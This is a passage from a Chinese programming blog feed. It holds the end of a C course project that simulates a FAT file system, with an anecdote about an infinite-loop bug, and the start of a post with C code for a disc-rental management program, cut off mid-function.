(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dirLastIndex; i++)</span><br><span class="line">        <span class="keyword">if</span> (d.directory[i].nodeId != <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                <span class="string">"|%-20s|%4d-%2d-%2d %2d:%2d:%2d|%4d-%2d-%2d "</span></span><br><span class="line">                <span class="string">"%2d:%2d:%2d|%-10d|%-10d|\n"</span>,</span><br><span class="line">                d.directory[i].fileName,</span><br><span class="line">                <span class="comment">// 年份从1900开始算起，因此要加上1900</span></span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].createTime))-&gt;tm_year +</span><br><span class="line">                    <span class="number">1900</span>,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].createTime))-&gt;tm_mon + <span class="number">1</span>,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].createTime))-&gt;tm_mday,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].createTime))-&gt;tm_hour + <span class="number">8</span>,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].createTime))-&gt;tm_min,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].createTime))-&gt;tm_sec,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].LastEditTime))-&gt;tm_year +</span><br><span class="line">                    <span class="number">1900</span>,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].LastEditTime))-&gt;tm_mon +</span><br><span class="line">                    <span class="number">1</span>,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].LastEditTime))-&gt;tm_mday,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].LastEditTime))-&gt;tm_hour +</span><br><span class="line">                    <span class="number">8</span>,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].LastEditTime))-&gt;tm_min,</span><br><span class="line">                gmtime(&amp;(d.FDI[d.directory[i].nodeId].LastEditTime))-&gt;tm_sec,</span><br><span class="line">                d.FDI[d.directory[i].nodeId].permission,</span><br><span class="line">                d.FDI[d.directory[i].nodeId].usedBlocksNum);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        <span class="string">"----------------------------------------------------------------------"</span></span><br><span class="line">        <span class="string">"--------------\n"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 错误码：</span></span><br><span class="line"><span class="comment"> * 2：文件不存在</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Delete</span><span class="params">(<span class="keyword">char</span> *fileName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; dirLastIndex; i++)</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(d.directory[i].fileName, fileName) &amp;&amp;</span><br><span class="line">            d.directory[i].nodeId != <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= dirLastIndex) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> nextIndex = d.FDI[d.directory[i].nodeId].firstBlockId;</span><br><span class="line">    <span class="keyword">int</span> row, col, pre;</span><br><span class="line">    <span class="keyword">while</span> (d.FAT[nextIndex] != EOF) &#123;</span><br><span class="line">        row = nextIndex / COL;</span><br><span class="line">        col = nextIndex % COL;</span><br><span class="line">        d.bitmap[row][col] = FREE;</span><br><span class="line">        pre = nextIndex;</span><br><span class="line">        nextIndex = d.FAT[nextIndex];</span><br><span class="line">        d.FAT[pre] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    row = nextIndex / COL;</span><br><span class="line">    col = nextIndex % COL;</span><br><span class="line">    d.bitmap[row][col] = FREE;</span><br><span class="line">    d.FDI[d.directory[i].nodeId].isDelete = <span class="number">1</span>;</span><br><span class="line">    d.directory[i].nodeId = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tryDelete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> fileName[<span class="number">11</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入您想要删除的文件：\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, fileName);</span><br><span class="line">    <span class="keyword">int</span> status = Delete(fileName);</span><br><span class="line">    <span class="keyword">if</span> (status == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"该文件不存在，请重新输入!\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"删除成功！\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showFAT</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, len = <span class="number">25</span>, j = <span class="number">1</span>, t, k;</span><br><span class="line">    <span class="keyword">for</span> (; j &lt;= <span class="number">4</span>; j++) &#123;</span><br><span class="line">        t = i;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">1</span>; k &lt;= <span class="number">114</span>; k++) <span class="built_in">printf</span>(<span class="string">"-"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"|%-12s|"</span>, <span class="string">"编号"</span>);</span><br><span class="line">        <span class="keyword">for</span> (; i &lt; j * len; i++) <span class="built_in">printf</span>(<span class="string">"%-3d|"</span>, i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"|%-12s|"</span>, <span class="string">"下一块盘块号"</span>);</span><br><span class="line">        <span class="keyword">for</span> (i = t; i &lt; j * len; i++) <span class="built_in">printf</span>(<span class="string">"%-3d|"</span>, d.FAT[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">1</span>; k &lt;= <span class="number">114</span>; k++) <span class="built_in">printf</span>(<span class="string">"-"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 初始化磁盘 即格式化</span></span><br><span class="line">    intial();</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exit</span> = <span class="number">0</span>, choice;</span><br><span class="line">    <span class="keyword">while</span> (!<span class="built_in">exit</span>) &#123;</span><br><span class="line">        system(<span class="string">"cls"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"1.创建文件\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"2.读取文件\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"3.写入文件\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"4.删除文件\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"5.显示示位图\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"6.列出所有文件\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"7.打印FAT\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0.退出系统\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice);</span><br><span class="line">        <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                tryCreate();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                tryRead();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                tryWrite();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                tryDelete();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                showBitmap();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                showFiles();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                showFAT();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">exit</span> = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"输入有误，请重新输入！\n"</span>);</span><br><span class="line">                system(<span class="string">"pause"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h2><p>在验收前的十几分钟突然发现<code>getFreeBlock()</code>函数有<code>bug</code>，当时立马从腾讯会议中退出来，测试了好久发现是<code>for</code>循环有问题，之前的写法是这样：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (; i &lt; <span class="number">7</span>; i =( i + <span class="number">1</span> ) % <span class="number">7</span>)</span><br><span class="line">	<span class="keyword">for</span> (; j &lt; <span class="number">16</span>; j = (j + <span class="number">1</span>) % <span class="number">16</span>) &#123;</span><br><span class="line">                </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样子内循环一直结束不了，造成了死循环。之前一直没发现这个问题是因为之前测试的时候，一般不会把文件大小改得很大，所以不会触发这个循环。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>课程设计</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次C语言程序设计</title>
    <url>/2020/07/02/%E8%AE%B0%E4%B8%80%E6%AC%A1C%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>那是一个闷热的下午，正值期末复习之际，突然手机响了：<a id="more"></a></p>
<p><img src="https://q.yalexin.top/%E8%81%8A%E5%A4%A9%E6%88%AA%E5%9B%BE.png" alt></p>
<p>然后因为是高中同桌兼舍友，所以就立马接了下来。但是当时我这边刚好是准备考试，所以时间上肯定不充裕，原本是想着两三天写出来，但是最后发现一天左右就完成了。但是功能并没有完全实现，还差最后的功能没有做出来，也没有过多的测试。</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><img src="https://q.yalexin.top/%E9%A2%98%E7%9B%AE.jpg" alt></p>
<p>其实C语言很多课程设计题目大多是使用结构体+文件操作（不排除大神的课设做得很复杂的情况），我当年拿到的就是学生成绩管理系统，对！就是这种烂大街的题目，这类题也是使用结构体+文件操作就可以解决，但是当时年少不知事，文件操作我自己一直掌握得不好，所以当时的程序无法保存数据~~，当时我还写了好久，在界面美观（狗屁美观，现在想想就是太花里胡哨了，在黑框里谈啥美观）上。所以本次课设，我就不考虑啥美观了，毕竟时间有限，能力也有限，简单构思了几分钟后，就根据整体框架设计结构体了，然后…………</p>
<h2 id="源程序"><a href="#源程序" class="headerlink" title="源程序"></a>源程序</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-05-26 15:12:01</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-05-27 15:09:36</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\maoning\1.c</span></span><br><span class="line"><span class="comment"> * @祈祷不出现BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DiscInfo</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> country[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> type[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> director[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> producer[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> stars[<span class="number">500</span>];</span><br><span class="line">    <span class="keyword">int</span> inventory;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">DiscInfo</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; DiscInfo;</span><br><span class="line"><span class="comment">// 每一条借阅记录</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">RentInfo</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> CId;</span><br><span class="line">    <span class="keyword">char</span> DName[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> BDate;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> RDate;</span><br><span class="line">    <span class="keyword">long</span> rentNum;</span><br><span class="line">    <span class="keyword">int</span> isReturn;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">RentInfo</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; RentInfo;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Blist</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> DName[<span class="number">50</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Blist</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; Blist;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CustomerInfo</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> id;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">long</span> acount;</span><br><span class="line">    Blist *RentList;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CustomerInfo</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; CustomerInfo;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">customerInitial</span><span class="params">(CustomerInfo **L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">long</span> id;</span><br><span class="line">    FILE *fp = fopen(<span class="string">"customer.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"customer.txt not exist！\n"</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">fscanf</span>(fp, <span class="string">"%ld"</span>, &amp;id) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            CustomerInfo *cRead = (CustomerInfo *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CustomerInfo));</span><br><span class="line">            cRead-&gt;RentList = <span class="literal">NULL</span>;</span><br><span class="line">            cRead-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            cRead-&gt;id = id;</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, cRead-&gt;name);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%ld"</span>, &amp;cRead-&gt;acount);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, <span class="built_in">buffer</span>);</span><br><span class="line">            <span class="keyword">while</span> (<span class="built_in">strcmp</span>(<span class="built_in">buffer</span>, <span class="string">"END"</span>)) &#123;</span><br><span class="line">                Blist *b = (Blist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Blist));</span><br><span class="line">                <span class="built_in">strcpy</span>(b-&gt;DName, <span class="built_in">buffer</span>);</span><br><span class="line">                b-&gt;next = cRead-&gt;RentList;</span><br><span class="line">                cRead-&gt;RentList = b;</span><br><span class="line">                <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, <span class="built_in">buffer</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            cRead-&gt;next = (*L);</span><br><span class="line">            (*L) = cRead;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\n\n读取到的顾客信息：\n\n"</span>);</span><br><span class="line">        CustomerInfo *c = *L;</span><br><span class="line">        <span class="keyword">while</span> (c != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%ld %s %ld"</span>, c-&gt;id, c-&gt;name, c-&gt;acount);</span><br><span class="line">            Blist *b = c-&gt;RentList;</span><br><span class="line">            <span class="keyword">while</span> (b != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">" %s"</span>, b-&gt;DName);</span><br><span class="line">                b = b-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">            c = c-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">discInitial</span><span class="params">(DiscInfo **L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">500</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">"disc.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"disc.txt not exist！\n"</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, <span class="built_in">buffer</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            DiscInfo *dRead = (DiscInfo *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DiscInfo));</span><br><span class="line">            dRead-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="built_in">strcpy</span>(dRead-&gt;name, <span class="built_in">buffer</span>);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, dRead-&gt;country);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, dRead-&gt;type);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, dRead-&gt;director);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, dRead-&gt;producer);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, dRead-&gt;stars);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%d"</span>, &amp;dRead-&gt;inventory);</span><br><span class="line">            dRead-&gt;next = (*L);</span><br><span class="line">            *L = dRead;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\n\n读取到的碟片信息：\n\n"</span>);</span><br><span class="line">        DiscInfo *d = *L;</span><br><span class="line">        <span class="keyword">while</span> (d != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s %s %s %s %s %s %d\n"</span>, d-&gt;name, d-&gt;country, d-&gt;type,</span><br><span class="line">                   d-&gt;director, d-&gt;producer, d-&gt;stars, d-&gt;inventory);</span><br><span class="line">            d = d-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rentInitial</span><span class="params">(RentInfo **L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">long</span> id;</span><br><span class="line">    FILE *fp = fopen(<span class="string">"rent.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"rent.txt not exist！\n"</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">fscanf</span>(fp, <span class="string">"%ld"</span>, &amp;id) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            RentInfo *rRead = (RentInfo *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(RentInfo));</span><br><span class="line">            rRead-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            rRead-&gt;CId = id;</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, rRead-&gt;DName);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%lld"</span>, &amp;rRead-&gt;BDate);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%lld"</span>, &amp;rRead-&gt;RDate);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%ld"</span>, &amp;rRead-&gt;rentNum);</span><br><span class="line">            <span class="built_in">fscanf</span>(fp, <span class="string">"%d"</span>, &amp;rRead-&gt;isReturn);</span><br><span class="line">            rRead-&gt;next = *L;</span><br><span class="line">            *L = rRead;</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n\n\n读取到的借阅信息\n\n"</span>);</span><br><span class="line">        RentInfo *r = *L;</span><br><span class="line">        <span class="keyword">while</span> (r != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%ld %s %lld %lld %ld %d\n"</span>, r-&gt;CId, r-&gt;DName, r-&gt;BDate,</span><br><span class="line">                   r-&gt;RDate, r-&gt;rentNum, r-&gt;isReturn);</span><br><span class="line">            r = r-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">discAdd</span><span class="params">(DiscInfo **L)</span> </span>&#123;</span><br><span class="line">    DiscInfo *newDisc = (DiscInfo *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DiscInfo));</span><br><span class="line">    newDisc-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入影碟名字:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, newDisc-&gt;name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入影碟国家:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, newDisc-&gt;country);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入影碟类型:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, newDisc-&gt;type);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入影碟导演:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, newDisc-&gt;director);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入影碟制片人:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, newDisc-&gt;producer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入影碟主演明星(如有多个，每个明星之间以空格隔开):\n"</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    fgets(newDisc-&gt;stars, <span class="keyword">sizeof</span>(newDisc-&gt;stars), <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入影碟库存量:\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;newDisc-&gt;inventory);</span><br><span class="line">    <span class="keyword">if</span> (*L == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *L = newDisc;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        newDisc-&gt;next = *L;</span><br><span class="line">        *L = newDisc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"添加完毕\n"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">discQuery</span><span class="params">(DiscInfo *L)</span> </span>&#123;</span><br><span class="line">    DiscInfo *p = L;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入您想要查询的碟片名字:\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> query[<span class="number">50</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, query);</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(query, p-&gt;name)) <span class="keyword">break</span>;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;inventory &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"可以借阅！\n"</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"不可以借阅，因为库存为零\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"不存在该影碟"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">discDelete</span><span class="params">(DiscInfo **L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((*L) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"还没有用户，无法删除!\n"</span>);</span><br><span class="line">        system(<span class="string">"pause"</span>);</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    DiscInfo *p1 = (*L)-&gt;next, *p2 = *L;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入您想要删除的碟片名字:\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> query[<span class="number">50</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, query);</span><br><span class="line">    <span class="comment">// 删除头节点</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>((*L)-&gt;name, query)) &#123;</span><br><span class="line">        (*L) = (*L)-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(p2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"删除成功"</span>);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (p1 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(query, p1-&gt;name)) <span class="keyword">break</span>;</span><br><span class="line">            p2 = p1;</span><br><span class="line">            p1 = p1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (p1 == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span 